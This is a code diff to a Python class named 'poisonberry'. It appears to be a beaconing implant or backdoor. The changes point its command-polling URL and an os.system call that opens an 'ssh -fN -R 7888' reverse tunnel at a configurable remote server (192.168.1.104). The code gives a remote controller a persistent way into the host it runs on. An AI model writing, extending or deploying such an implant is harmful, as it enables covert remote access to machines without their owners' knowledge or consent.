@@ -16,7 +16,8 @@ class poisonberry:
     def __init__(self):
         self.endpoint = {}
         self.beacon = True
-        self.home = "watch@192.168.1.104"
+        self.home= "watch"
+        self.server = "192.168.1.104"
         self.data= {}
         self.command={}
         self.run={}
@@ -86,7 +87,7 @@ class poisonberry:
     def handle_request(self):
         try:
                 log(INFO,"trying to GET from %s"%(self.endpoint))
-                self.endpoint = "http://localhost:8000/site2.html"
+                self.endpoint = "http://"+self.server+":8000/site2.html"
                 self.data = urllib.request.urlopen(self.endpoint)
 
                 self.parse_response()
@@ -114,7 +115,7 @@ class poisonberry:
         else:
             if self.tryPort() == True:
 
-                cmd = '/usr/bin/ssh -fN -R 7888:localhost:'+str(self.port) + " " + self.home # TODO replace with ssh tunnel
+                cmd = '/usr/bin/ssh -fN -R 7888:localhost:'+str(self.port) + " " + self.home+"@"+self.server# TODO replace with ssh tunnel
                 print(cmd)
                 os.system(cmd)
                 log(DEBUG,"running")
